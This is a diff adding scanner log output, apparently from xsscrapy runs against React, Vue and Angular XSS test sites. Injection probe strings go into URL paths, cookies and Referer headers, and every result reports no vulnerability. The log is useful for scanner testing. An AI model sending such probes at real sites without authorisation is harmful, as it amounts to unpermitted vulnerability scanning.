+ 'scrapy.downloadermiddlewares.chunked.ChunkedTransferMiddleware',
+ 'scrapy.downloadermiddlewares.stats.DownloaderStats']
+2021-06-28 17:21:26 [scrapy] INFO: Enabled spider middlewares:
+['scrapy.spidermiddlewares.httperror.HttpErrorMiddleware',
+ 'scrapy.spidermiddlewares.offsite.OffsiteMiddleware',
+ 'scrapy.spidermiddlewares.referer.RefererMiddleware',
+ 'scrapy.spidermiddlewares.urllength.UrlLengthMiddleware',
+ 'scrapy.spidermiddlewares.depth.DepthMiddleware']
+2021-06-28 17:21:26 [scrapy] INFO: Enabled item pipelines:
+['xsscrapy.pipelines.XSSCharFinder']
+2021-06-28 17:21:26 [scrapy] INFO: Spider opened
+2021-06-28 17:21:26 [scrapy] INFO: Crawled 0 pages (at 0 pages/min), scraped 0 items (at 0 items/min)
+2021-06-28 17:21:26 [scrapy] DEBUG: Telnet console listening on 127.0.0.1:6023
+2021-06-28 17:21:51 [scrapy] DEBUG: Crawled (200) <GET https://react-xss-suite-test-site.herokuapp.com/> (referer: None)
+2021-06-28 17:21:51 [xsscrapy] DEBUG: Sending payloaded URL: https://react-xss-suite-test-site.herokuapp.com/1zqjze'%22()%7B%7D%3Cx%3E:1zqjze;9
+2021-06-28 17:21:51 [xsscrapy] DEBUG: Sending payloaded cookie header
+2021-06-28 17:21:51 [xsscrapy] DEBUG: Sending payloaded Referer header
+2021-06-28 17:21:51 [scrapy] DEBUG: Crawled (200) <GET https://react-xss-suite-test-site.herokuapp.com//requestXaX404> (referer: https://react-xss-suite-test-site.herokuapp.com/)
+2021-06-28 17:21:51 [xsscrapy] DEBUG: Sending payloaded URL: https://react-xss-suite-test-site.herokuapp.com//requestXaX404/1zqjpe'%22()%7B%7D%3Cx%3E:1zqjpe;9
+2021-06-28 17:21:51 [xsscrapy] DEBUG: Sending payloaded cookie header
+2021-06-28 17:21:51 [xsscrapy] DEBUG: Sending payloaded Referer header
+2021-06-28 17:21:51 [scrapy] DEBUG: Crawled (200) <GET https://react-xss-suite-test-site.herokuapp.com/robots.txt> (referer: https://react-xss-suite-test-site.herokuapp.com/)
+2021-06-28 17:21:51 [scrapy] DEBUG: Crawled (200) <GET https://react-xss-suite-test-site.herokuapp.com/1zqjze'%22()%7B%7D%3Cx%3E:1zqjze;9> (referer: https://react-xss-suite-test-site.herokuapp.com/)
+2021-06-28 17:21:51 [scrapy] DEBUG: Crawled (200) <GET https://react-xss-suite-test-site.herokuapp.com/> (referer: https://react-xss-suite-test-site.herokuapp.com/)
+2021-06-28 17:21:51 [scrapy] DEBUG: Crawled (200) <GET https://react-xss-suite-test-site.herokuapp.com/> (referer: 1zqjlz'"(){}<x>:/1zqjlz;9)
+2021-06-28 17:21:51 [scrapy] DEBUG: Crawled (200) <GET https://react-xss-suite-test-site.herokuapp.com//requestXaX404/1zqjpe'%22()%7B%7D%3Cx%3E:1zqjpe;9> (referer: https://react-xss-suite-test-site.herokuapp.com//requestXaX404)
+2021-06-28 17:21:51 [scrapy] WARNING: Dropped: No XSS vulns in https://react-xss-suite-test-site.herokuapp.com/1zqjze'%22()%7B%7D%3Cx%3E:1zqjze;9. type = url, end of url
+
+2021-06-28 17:21:51 [scrapy] WARNING: Dropped: No XSS vulns in https://react-xss-suite-test-site.herokuapp.com/. type = header, cookie
+
+2021-06-28 17:21:51 [scrapy] WARNING: Dropped: No XSS vulns in https://react-xss-suite-test-site.herokuapp.com/. type = header, Referer
+
+2021-06-28 17:21:51 [scrapy] WARNING: Dropped: No XSS vulns in https://react-xss-suite-test-site.herokuapp.com//requestXaX404/1zqjpe'%22()%7B%7D%3Cx%3E:1zqjpe;9. type = url, end of url
+
+2021-06-28 17:21:51 [scrapy] DEBUG: Crawled (200) <GET https://react-xss-suite-test-site.herokuapp.com//requestXaX404> (referer: 1zqjpk'"(){}<x>:/1zqjpk;9)
+2021-06-28 17:21:51 [scrapy] DEBUG: Crawled (200) <GET https://react-xss-suite-test-site.herokuapp.com//requestXaX404> (referer: https://react-xss-suite-test-site.herokuapp.com//requestXaX404)
+2021-06-28 17:21:51 [scrapy] WARNING: Dropped: No XSS vulns in https://react-xss-suite-test-site.herokuapp.com//requestXaX404. type = header, Referer
+
+2021-06-28 17:21:51 [scrapy] WARNING: Dropped: No XSS vulns in https://react-xss-suite-test-site.herokuapp.com//requestXaX404. type = header, cookie
+
+2021-06-28 17:21:51 [scrapy] INFO: Closing spider (finished)
+2021-06-28 17:21:51 [scrapy] INFO: Dumping Scrapy stats:
+{'downloader/request_bytes': 3376,
+ 'downloader/request_count': 9,
+ 'downloader/request_method_count/GET': 9,
+ 'downloader/response_bytes': 9338,
+ 'downloader/response_count': 9,
+ 'downloader/response_status_count/200': 9,
+ 'finish_reason': 'finished',
+ 'finish_time': datetime.datetime(2021, 6, 28, 17, 21, 51, 814018),
+ 'item_dropped_count': 6,
+ 'item_dropped_reasons_count/DropItem': 6,
+ 'log_count/DEBUG': 16,
+ 'log_count/INFO': 7,
+ 'log_count/WARNING': 6,
+ 'request_depth_max': 2,
+ 'response_received_count': 9,
+ 'scheduler/dequeued': 9,
+ 'scheduler/dequeued/memory': 9,
+ 'scheduler/enqueued': 9,
+ 'scheduler/enqueued/memory': 9,
+ 'start_time': datetime.datetime(2021, 6, 28, 17, 21, 26, 713404)}
+2021-06-28 17:21:51 [scrapy] INFO: Spider closed (finished)
+/usr/local/lib/python2.7/site-packages/OpenSSL/crypto.py:14: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
+  from cryptography import utils, x509
+/usr/local/lib/python2.7/site-packages/BeautifulSoup.py:114: UserWarning: You are using a very old release of Beautiful Soup, last updated in 2011. If you installed the 'beautifulsoup' package through pip, you should know the 'beautifulsoup' package name is about to be reclaimed by a more recent version of Beautiful Soup which is incompatible with this version.
+
+This will happen at some point after January 1, 2021.
+
+If you just started this project, this is easy to fix. Install the 'beautifulsoup4' package instead of 'beautifulsoup' and start using Beautiful Soup 4.
+
+If this is an existing project that depends on Beautiful Soup 3, the project maintainer (potentially you) needs to start the process of migrating to Beautiful Soup 4. This should be a relatively easy part of the Python 3 migration.
+
+  """)
+2021-06-28 17:21:52 [scrapy] INFO: Scrapy 1.1.0rc3 started (bot: xsscrapy)
+2021-06-28 17:21:52 [scrapy] INFO: Overridden settings: {'NEWSPIDER_MODULE': 'xsscrapy.spiders', 'DUPEFILTER_CLASS': 'xsscrapy.bloomfilters.BloomURLDupeFilter', 'SPIDER_MODULES': ['xsscrapy.spiders'], 'CONCURRENT_REQUESTS': '30', 'BOT_NAME': 'xsscrapy', 'DOWNLOAD_DELAY': '0'}
+2021-06-28 17:21:52 [scrapy] INFO: Enabled extensions:
+['scrapy.extensions.logstats.LogStats',
+ 'scrapy.extensions.telnet.TelnetConsole',
+ 'scrapy.extensions.corestats.CoreStats']
+2021-06-28 17:21:52 [scrapy] INFO: Enabled downloader middlewares:
+['xsscrapy.middlewares.InjectedDupeFilter',
+ 'xsscrapy.middlewares.RandomUserAgentMiddleware',
+ 'scrapy.downloadermiddlewares.httpauth.HttpAuthMiddleware',
+ 'scrapy.downloadermiddlewares.downloadtimeout.DownloadTimeoutMiddleware',
+ 'scrapy.downloadermiddlewares.useragent.UserAgentMiddleware',
+ 'scrapy.downloadermiddlewares.retry.RetryMiddleware',
+ 'scrapy.downloadermiddlewares.defaultheaders.DefaultHeadersMiddleware',
+ 'scrapy.downloadermiddlewares.redirect.MetaRefreshMiddleware',
+ 'scrapy.downloadermiddlewares.httpcompression.HttpCompressionMiddleware',
+ 'scrapy.downloadermiddlewares.redirect.RedirectMiddleware',
+ 'scrapy.downloadermiddlewares.cookies.CookiesMiddleware',
+ 'scrapy.downloadermiddlewares.chunked.ChunkedTransferMiddleware',
+ 'scrapy.downloadermiddlewares.stats.DownloaderStats']
+2021-06-28 17:21:52 [scrapy] INFO: Enabled spider middlewares:
+['scrapy.spidermiddlewares.httperror.HttpErrorMiddleware',
+ 'scrapy.spidermiddlewares.offsite.OffsiteMiddleware',
+ 'scrapy.spidermiddlewares.referer.RefererMiddleware',
+ 'scrapy.spidermiddlewares.urllength.UrlLengthMiddleware',
+ 'scrapy.spidermiddlewares.depth.DepthMiddleware']
+2021-06-28 17:21:52 [scrapy] INFO: Enabled item pipelines:
+['xsscrapy.pipelines.XSSCharFinder']
+2021-06-28 17:21:52 [scrapy] INFO: Spider opened
+2021-06-28 17:21:52 [scrapy] INFO: Crawled 0 pages (at 0 pages/min), scraped 0 items (at 0 items/min)
+2021-06-28 17:21:52 [scrapy] DEBUG: Telnet console listening on 127.0.0.1:6023
+2021-06-28 17:22:06 [scrapy] DEBUG: Crawled (200) <GET https://vue-xss-suite-test-site.herokuapp.com/> (referer: None)
+2021-06-28 17:22:06 [xsscrapy] DEBUG: Sending payloaded URL: https://vue-xss-suite-test-site.herokuapp.com/1zqjcq'%22()%7B%7D%3Cx%3E:1zqjcq;9
+2021-06-28 17:22:06 [xsscrapy] DEBUG: Sending payloaded cookie header
+2021-06-28 17:22:06 [xsscrapy] DEBUG: Sending payloaded Referer header
+2021-06-28 17:22:07 [scrapy] DEBUG: Crawled (200) <GET https://vue-xss-suite-test-site.herokuapp.com//requestXaX404> (referer: https://vue-xss-suite-test-site.herokuapp.com/)
+2021-06-28 17:22:07 [xsscrapy] DEBUG: Sending payloaded URL: https://vue-xss-suite-test-site.herokuapp.com//requestXaX404/1zqjlj'%22()%7B%7D%3Cx%3E:1zqjlj;9
+2021-06-28 17:22:07 [xsscrapy] DEBUG: Sending payloaded cookie header
+2021-06-28 17:22:07 [xsscrapy] DEBUG: Sending payloaded Referer header
+2021-06-28 17:22:07 [scrapy] DEBUG: Crawled (200) <GET https://vue-xss-suite-test-site.herokuapp.com/1zqjcq'%22()%7B%7D%3Cx%3E:1zqjcq;9> (referer: https://vue-xss-suite-test-site.herokuapp.com/)
+2021-06-28 17:22:07 [scrapy] DEBUG: Crawled (200) <GET https://vue-xss-suite-test-site.herokuapp.com/> (referer: 1zqjgu'"(){}<x>:/1zqjgu;9)
+2021-06-28 17:22:07 [scrapy] DEBUG: Crawled (200) <GET https://vue-xss-suite-test-site.herokuapp.com//requestXaX404/1zqjlj'%22()%7B%7D%3Cx%3E:1zqjlj;9> (referer: https://vue-xss-suite-test-site.herokuapp.com//requestXaX404)
+2021-06-28 17:22:07 [scrapy] DEBUG: Crawled (200) <GET https://vue-xss-suite-test-site.herokuapp.com/> (referer: https://vue-xss-suite-test-site.herokuapp.com/)
+2021-06-28 17:22:07 [scrapy] DEBUG: Crawled (200) <GET https://vue-xss-suite-test-site.herokuapp.com/robots.txt> (referer: https://vue-xss-suite-test-site.herokuapp.com/)
+2021-06-28 17:22:07 [scrapy] WARNING: Dropped: No XSS vulns in https://vue-xss-suite-test-site.herokuapp.com/1zqjcq'%22()%7B%7D%3Cx%3E:1zqjcq;9. type = url, end of url
+
+2021-06-28 17:22:07 [scrapy] WARNING: Dropped: No XSS vulns in https://vue-xss-suite-test-site.herokuapp.com/. type = header, Referer
+
+2021-06-28 17:22:07 [scrapy] WARNING: Dropped: No XSS vulns in https://vue-xss-suite-test-site.herokuapp.com//requestXaX404/1zqjlj'%22()%7B%7D%3Cx%3E:1zqjlj;9. type = url, end of url
+
+2021-06-28 17:22:07 [scrapy] WARNING: Dropped: No XSS vulns in https://vue-xss-suite-test-site.herokuapp.com/. type = header, cookie
+
+2021-06-28 17:22:07 [scrapy] DEBUG: Crawled (200) <GET https://vue-xss-suite-test-site.herokuapp.com//requestXaX404> (referer: https://vue-xss-suite-test-site.herokuapp.com//requestXaX404)
+2021-06-28 17:22:07 [scrapy] DEBUG: Crawled (200) <GET https://vue-xss-suite-test-site.herokuapp.com//requestXaX404> (referer: 1zqjwl'"(){}<x>:/1zqjwl;9)
+2021-06-28 17:22:07 [scrapy] WARNING: Dropped: No XSS vulns in https://vue-xss-suite-test-site.herokuapp.com//requestXaX404. type = header, cookie
+
+2021-06-28 17:22:07 [scrapy] WARNING: Dropped: No XSS vulns in https://vue-xss-suite-test-site.herokuapp.com//requestXaX404. type = header, Referer
+
+2021-06-28 17:22:07 [scrapy] INFO: Closing spider (finished)
+2021-06-28 17:22:07 [scrapy] INFO: Dumping Scrapy stats:
+{'downloader/request_bytes': 3358,
+ 'downloader/request_count': 9,
+ 'downloader/request_method_count/GET': 9,
+ 'downloader/response_bytes': 9648,
+ 'downloader/response_count': 9,
+ 'downloader/response_status_count/200': 9,
+ 'finish_reason': 'finished',
+ 'finish_time': datetime.datetime(2021, 6, 28, 17, 22, 7, 523830),
+ 'item_dropped_count': 6,
+ 'item_dropped_reasons_count/DropItem': 6,
+ 'log_count/DEBUG': 16,
+ 'log_count/INFO': 7,
+ 'log_count/WARNING': 6,
+ 'request_depth_max': 2,
+ 'response_received_count': 9,
+ 'scheduler/dequeued': 9,
+ 'scheduler/dequeued/memory': 9,
+ 'scheduler/enqueued': 9,
+ 'scheduler/enqueued/memory': 9,
+ 'start_time': datetime.datetime(2021, 6, 28, 17, 21, 52, 342030)}
+2021-06-28 17:22:07 [scrapy] INFO: Spider closed (finished)
+/usr/local/lib/python2.7/site-packages/OpenSSL/crypto.py:14: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
+  from cryptography import utils, x509
+/usr/local/lib/python2.7/site-packages/BeautifulSoup.py:114: UserWarning: You are using a very old release of Beautiful Soup, last updated in 2011. If you installed the 'beautifulsoup' package through pip, you should know the 'beautifulsoup' package name is about to be reclaimed by a more recent version of Beautiful Soup which is incompatible with this version.
+
+This will happen at some point after January 1, 2021.
+
+If you just started this project, this is easy to fix. Install the 'beautifulsoup4' package instead of 'beautifulsoup' and start using Beautiful Soup 4.
+
+If this is an existing project that depends on Beautiful Soup 3, the project maintainer (potentially you) needs to start the process of migrating to Beautiful Soup 4. This should be a relatively easy part of the Python 3 migration.
+
+  """)
+2021-06-28 17:22:08 [scrapy] INFO: Scrapy 1.1.0rc3 started (bot: xsscrapy)
+2021-06-28 17:22:08 [scrapy] INFO: Overridden settings: {'NEWSPIDER_MODULE': 'xsscrapy.spiders', 'DUPEFILTER_CLASS': 'xsscrapy.bloomfilters.BloomURLDupeFilter', 'SPIDER_MODULES': ['xsscrapy.spiders'], 'CONCURRENT_REQUESTS': '30', 'BOT_NAME': 'xsscrapy', 'DOWNLOAD_DELAY': '0'}
+2021-06-28 17:22:08 [scrapy] INFO: Enabled extensions:
+['scrapy.extensions.logstats.LogStats',
+ 'scrapy.extensions.telnet.TelnetConsole',
+ 'scrapy.extensions.corestats.CoreStats']
+2021-06-28 17:22:08 [scrapy] INFO: Enabled downloader middlewares:
+['xsscrapy.middlewares.InjectedDupeFilter',
+ 'xsscrapy.middlewares.RandomUserAgentMiddleware',
+ 'scrapy.downloadermiddlewares.httpauth.HttpAuthMiddleware',
+ 'scrapy.downloadermiddlewares.downloadtimeout.DownloadTimeoutMiddleware',
+ 'scrapy.downloadermiddlewares.useragent.UserAgentMiddleware',
+ 'scrapy.downloadermiddlewares.retry.RetryMiddleware',
+ 'scrapy.downloadermiddlewares.defaultheaders.DefaultHeadersMiddleware',
+ 'scrapy.downloadermiddlewares.redirect.MetaRefreshMiddleware',
+ 'scrapy.downloadermiddlewares.httpcompression.HttpCompressionMiddleware',
+ 'scrapy.downloadermiddlewares.redirect.RedirectMiddleware',
+ 'scrapy.downloadermiddlewares.cookies.CookiesMiddleware',
+ 'scrapy.downloadermiddlewares.chunked.ChunkedTransferMiddleware',
+ 'scrapy.downloadermiddlewares.stats.DownloaderStats']
+2021-06-28 17:22:08 [scrapy] INFO: Enabled spider middlewares:
+['scrapy.spidermiddlewares.httperror.HttpErrorMiddleware',
+ 'scrapy.spidermiddlewares.offsite.OffsiteMiddleware',
+ 'scrapy.spidermiddlewares.referer.RefererMiddleware',
+ 'scrapy.spidermiddlewares.urllength.UrlLengthMiddleware',
+ 'scrapy.spidermiddlewares.depth.DepthMiddleware']
+2021-06-28 17:22:08 [scrapy] INFO: Enabled item pipelines:
+['xsscrapy.pipelines.XSSCharFinder']
+2021-06-28 17:22:08 [scrapy] INFO: Spider opened
+2021-06-28 17:22:08 [scrapy] INFO: Crawled 0 pages (at 0 pages/min), scraped 0 items (at 0 items/min)
+2021-06-28 17:22:08 [scrapy] DEBUG: Telnet console listening on 127.0.0.1:6023
+2021-06-28 17:22:08 [scrapy] DEBUG: Crawled (200) <GET https://angular-xss-suite-test-site.herokuapp.com/> (referer: None)
+2021-06-28 17:22:08 [xsscrapy] DEBUG: Sending payloaded URL: https://angular-xss-suite-test-site.herokuapp.com/1zqjnq'%22()%7B%7D%3Cx%3E:1zqjnq;9
+2021-06-28 17:22:08 [xsscrapy] DEBUG: Sending payloaded cookie header
+2021-06-28 17:22:08 [xsscrapy] DEBUG: Sending payloaded Referer header
+2021-06-28 17:22:08 [scrapy] DEBUG: Crawled (200) <GET https://angular-xss-suite-test-site.herokuapp.com//requestXaX404> (referer: https://angular-xss-suite-test-site.herokuapp.com/)
+2021-06-28 17:22:08 [xsscrapy] DEBUG: Sending payloaded URL: https://angular-xss-suite-test-site.herokuapp.com//requestXaX404/1zqjww'%22()%7B%7D%3Cx%3E:1zqjww;9
+2021-06-28 17:22:08 [xsscrapy] DEBUG: Sending payloaded cookie header
+2021-06-28 17:22:08 [xsscrapy] DEBUG: Sending payloaded Referer header
+2021-06-28 17:22:08 [scrapy] DEBUG: Crawled (200) <GET https://angular-xss-suite-test-site.herokuapp.com/1zqjnq'%22()%7B%7D%3Cx%3E:1zqjnq;9> (referer: https://angular-xss-suite-test-site.herokuapp.com/)
+2021-06-28 17:22:08 [scrapy] DEBUG: Crawled (200) <GET https://angular-xss-suite-test-site.herokuapp.com/> (referer: 1zqjyo'"(){}<x>:/1zqjyo;9)
+2021-06-28 17:22:08 [scrapy] DEBUG: Crawled (200) <GET https://angular-xss-suite-test-site.herokuapp.com/robots.txt> (referer: https://angular-xss-suite-test-site.herokuapp.com/)
+2021-06-28 17:22:08 [scrapy] DEBUG: Crawled (200) <GET https://angular-xss-suite-test-site.herokuapp.com//requestXaX404/1zqjww'%22()%7B%7D%3Cx%3E:1zqjww;9> (referer: https://angular-xss-suite-test-site.herokuapp.com//requestXaX404)
+2021-06-28 17:22:08 [scrapy] DEBUG: Crawled (200) <GET https://angular-xss-suite-test-site.herokuapp.com/> (referer: https://angular-xss-suite-test-site.herokuapp.com/)
+2021-06-28 17:22:08 [scrapy] WARNING: Dropped: No XSS vulns in https://angular-xss-suite-test-site.herokuapp.com/1zqjnq'%22()%7B%7D%3Cx%3E:1zqjnq;9. type = url, end of url
+
+2021-06-28 17:22:08 [scrapy] WARNING: Dropped: No XSS vulns in https://angular-xss-suite-test-site.herokuapp.com/. type = header, Referer
+
+2021-06-28 17:22:08 [scrapy] WARNING: Dropped: No XSS vulns in https://angular-xss-suite-test-site.herokuapp.com//requestXaX404/1zqjww'%22()%7B%7D%3Cx%3E:1zqjww;9. type = url, end of url
+
+2021-06-28 17:22:08 [scrapy] WARNING: Dropped: No XSS vulns in https://angular-xss-suite-test-site.herokuapp.com/. type = header, cookie
+
+2021-06-28 17:22:08 [scrapy] DEBUG: Crawled (200) <GET https://angular-xss-suite-test-site.herokuapp.com//requestXaX404> (referer: 1zqjyz'"(){}<x>:/1zqjyz;9)
+2021-06-28 17:22:08 [scrapy] DEBUG: Crawled (200) <GET https://angular-xss-suite-test-site.herokuapp.com//requestXaX404> (referer: https://angular-xss-suite-test-site.herokuapp.com//requestXaX404)
+2021-06-28 17:22:08 [scrapy] WARNING: Dropped: No XSS vulns in https://angular-xss-suite-test-site.herokuapp.com//requestXaX404. type = header, Referer
+
+2021-06-28 17:22:08 [scrapy] WARNING: Dropped: No XSS vulns in https://angular-xss-suite-test-site.herokuapp.com//requestXaX404. type = header, cookie
+
+2021-06-28 17:22:08 [scrapy] INFO: Closing spider (finished)
+2021-06-28 17:22:08 [scrapy] INFO: Dumping Scrapy stats:
+{'downloader/request_bytes': 3490,
+ 'downloader/request_count': 9,
+ 'downloader/request_method_count/GET': 9,
+ 'downloader/response_bytes': 7074,
+ 'downloader/response_count': 9,
+ 'downloader/response_status_count/200': 9,
+ 'finish_reason': 'finished',
+ 'finish_time': datetime.datetime(2021, 6, 28, 17, 22, 8, 979834),
+ 'item_dropped_count': 6,
+ 'item_dropped_reasons_count/DropItem': 6,
+ 'log_count/DEBUG': 16,
+ 'log_count/INFO': 7,
+ 'log_count/WARNING': 6,
+ 'request_depth_max': 2,
+ 'response_received_count': 9,
+ 'scheduler/dequeued': 9,
+ 'scheduler/dequeued/memory': 9,
+ 'scheduler/enqueued': 9,
+ 'scheduler/enqueued/memory': 9,
+ 'start_time': datetime.datetime(2021, 6, 28, 17, 22, 8, 71504)}
+2021-06-28 17:22:08 [scrapy] INFO: Spider closed (finished)
